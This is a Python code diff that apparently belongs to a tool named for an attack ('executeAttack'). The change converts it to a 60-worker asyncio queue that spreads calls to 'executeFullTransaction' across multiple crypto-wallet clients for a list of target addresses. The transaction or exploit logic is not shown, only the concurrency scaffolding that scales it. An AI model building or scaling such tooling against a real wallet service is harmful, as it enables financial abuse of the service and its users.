@@ -56,14 +56,30 @@ def read_processed_addresses(results_file: Path) -> set[str]:
     return processed
 
 
-async def worker(client: CWalletClient, address: str, amount: str, coin: CryptoCoin, writer) -> None:
-    data = await client.executeFullTransaction(address, amount, coin)
+async def queue_worker(name: int, queue: asyncio.Queue, clients: list[CWalletClient], amount: str, coin: CryptoCoin, writer):
+    while True:
+        try:
+            address = await queue.get()
+        except asyncio.CancelledError:
+            break
 
-    async with lock:
-        await writer.writerow({"address": address, "result": json.dumps(data)})
+        client = clients[name % len(clients)]
+
+        try:
+            data = await client.executeFullTransaction(address, amount, coin)
+            print(f"Worker {name} processed address: {address}, result: {data}")
+            async with lock:
+                await writer.writerow({
+                    "address": address,
+                    "result": json.dumps(data)
+                })
+        except Exception as e:
+            print(f"Worker {name} error: {e}")
+
+        queue.task_done()
 
 
-async def executeAttack(addressesFileName: str, resultsFileName: str, client: CWalletClient, coin: CryptoCoin, amount: str) -> None:
+async def executeAttack(addressesFileName: str, resultsFileName: str, clients: list[CWalletClient], coin: CryptoCoin, amount: str) -> None:
 
     addresses_file = getDataFilePath(addressesFileName)
     results_file = getDataFilePath(resultsFileName)
@@ -101,9 +117,24 @@ async def executeAttack(addressesFileName: str, resultsFileName: str, client: CW
         if not file_exists:
             await writer.writeheader()
 
-        tasks = []
-        for address in remaining_addresses:
-            tasks.append(worker(client, address, amount, coin, writer))
+        queue = asyncio.Queue()
 
-        await asyncio.gather(*tasks)
+        for addr in remaining_addresses:
+            queue.put_nowait(addr)
+
+        NUM_WORKERS = 60  # tune this
+
+        workers = [
+            asyncio.create_task(
+                queue_worker(i, queue, clients, amount, coin, writer)
+            )
+            for i in range(NUM_WORKERS)
+        ]
+
+        await queue.join()
+
+        for w in workers:
+            w.cancel()
+        
+        await asyncio.gather(*workers, return_exceptions=True)
 
